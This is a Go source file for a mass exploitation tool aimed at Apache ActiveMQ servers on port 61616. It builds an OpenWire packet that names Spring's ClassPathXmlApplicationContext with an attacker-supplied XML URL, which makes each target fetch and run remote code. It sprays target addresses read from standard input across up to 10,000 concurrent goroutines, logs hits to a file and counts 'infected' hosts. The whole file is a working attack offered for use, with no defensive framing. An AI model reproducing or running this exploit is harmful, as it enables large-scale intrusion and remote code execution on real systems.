package main

import (
	"bufio"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	seconds    uint64
	ok         uint64
	total      uint64
	sent       uint64
	found      uint64
	resultFile *os.File
	fileMutex  sync.Mutex
)

func sendPacketTLS(ip, port, url string, useTLS bool, wg *sync.WaitGroup) {
	defer wg.Done()
	total++

	className := "org.springframework.context.support.ClassPathXmlApplicationContext"
	message := url

	header := "1f00000000000000000001"
	body := header +
		"01" + int2Hex(len(className), 4) + string2Hex(className) +
		"01" + int2Hex(len(message), 4) + string2Hex(message)

	payload := int2Hex(len(body)/2, 8) + body
	data, _ := hex.DecodeString(payload)

	var conn net.Conn
	var err error

	if useTLS {
		conf := &tls.Config{InsecureSkipVerify: true}
		conn, err = tls.Dial("tcp", ip+":"+port, conf)
	} else {
		conn, err = net.Dial("tcp", ip+":"+port)
	}

	if err != nil {
		return
	}
	defer conn.Close()

	found++
	
	if _, err := conn.Write(data); err == nil {
		ok++
	}

	fileMutex.Lock()
	fmt.Fprintf(resultFile, "%s:%s\n", ip, port)
	fileMutex.Unlock()
}

func titleWriter() {
	for {
		fmt.Printf("\r[%d'] total: %d | found: %d | infected: %d", seconds, total, found, ok)
		time.Sleep(1 * time.Second)
		seconds++
	}
}

func string2Hex(s string) string {
	return hex.EncodeToString([]byte(s))
}

func int2Hex(i int, n int) string {
	if n == 4 {
		return fmt.Sprintf("%04s", strconv.FormatInt(int64(i), 16))
	} else if n == 8 {
		return fmt.Sprintf("%08s", strconv.FormatInt(int64(i), 16))
	} else {
		panic("n must be 4 or 8")
	}
}

func main() {
	var (
		port     string
		url      string
		useTLS   bool
		routines int
	)

	flag.StringVar(&port, "p", "61616", "Server Port")
	flag.StringVar(&url, "u", "", "Spring XML URL")
	flag.BoolVar(&useTLS, "t", false, "Use TLS for connection")
	flag.IntVar(&routines, "r", 10000, "Maximum number of go routines")
	flag.Parse()

	var err error
	resultFile, err = os.OpenFile("aq.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if err != nil {
		log.Fatalf("Cannot create file: %v", err)
	}
	defer resultFile.Close()

	go titleWriter()

	if url == "" {
		flag.Usage()
		return
	}

	var wg sync.WaitGroup
	scan := bufio.NewScanner(os.Stdin)

	for scan.Scan() {
		wg.Add(1)
		go sendPacketTLS(scan.Text(), port, url, useTLS, &wg)
	}

	wg.Wait()
}
